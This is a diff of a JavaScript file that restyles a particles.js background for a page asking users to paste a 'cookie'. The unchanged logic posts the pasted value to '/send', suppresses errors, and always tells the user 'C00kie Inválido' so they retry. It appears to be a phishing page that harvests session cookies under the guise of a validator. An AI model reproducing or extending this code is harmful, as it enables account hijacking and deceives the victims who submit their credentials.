@@ -1,32 +1,45 @@
-// Inicia particles assim que o DOM carregar
 document.addEventListener("DOMContentLoaded", function () {
   particlesJS("particles-js", {
     particles: {
-      number: { value: 80 },
-      color: { value: "#00dbde" },
+      number: { value: 40 },
+      color: { value: "#00ffea" },
       shape: { type: "circle" },
-      opacity: { value: 0.5, random: true },
-      size: { value: 3, random: true },
-      line_linked: { enable: true, distance: 150, color: "#00dbde", opacity: 0.4, width: 1 },
-      move: { enable: true, speed: 2 }
+      opacity: { value: 0.3, random: true },
+      size: { value: 2, random: true },
+      line_linked: { enable: false },
+      move: {
+        enable: true,
+        speed: 0.6,
+        direction: "none",
+        random: true,
+        straight: false,
+        out_mode: "out"
+      }
     },
     interactivity: {
       detect_on: "canvas",
-      events: { onhover: { enable: true, mode: "repulse" } }
-    }
+      events: {
+        onhover: { enable: true, mode: "bubble" },
+        resize: true
+      },
+      modes: {
+        bubble: { distance: 150, size: 4, duration: 2, opacity: 0.6, speed: 3 }
+      }
+    },
+    retina_detect: true
   });
 
   const input = document.getElementById("cookieInput");
   const btn = document.getElementById("sendBtn");
   const status = document.getElementById("status");
 
-  const sendCookie = async () => {
+  const send = async () => {
     const cookie = input.value.trim();
     if (!cookie) return;
 
-    status.textContent = "";
-    btn.disabled = true;
     btn.textContent = "Enviando...";
+    btn.disabled = true;
+    status.textContent = "";
 
     try {
       await fetch("/send", {
@@ -34,18 +47,15 @@ document.addEventListener("DOMContentLoaded", function () {
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ cookie })
       });
-    } catch (e) {}
+    } catch(e) {}
 
     status.textContent = "C00kie Inválido";
-    status.style.color = "#ff0066";
     input.value = "";
-    btn.disabled = false;
     btn.textContent = "Enviar";
+    btn.disabled = false;
     input.focus();
   };
 
-  btn.addEventListener("click", sendCookie);
-  input.addEventListener("keypress", e => {
-    if (e.key === "Enter") sendCookie();
-  });
+  btn.addEventListener("click", send);
+  input.addEventListener("keypress", e => e.key === "Enter" && send());
 });
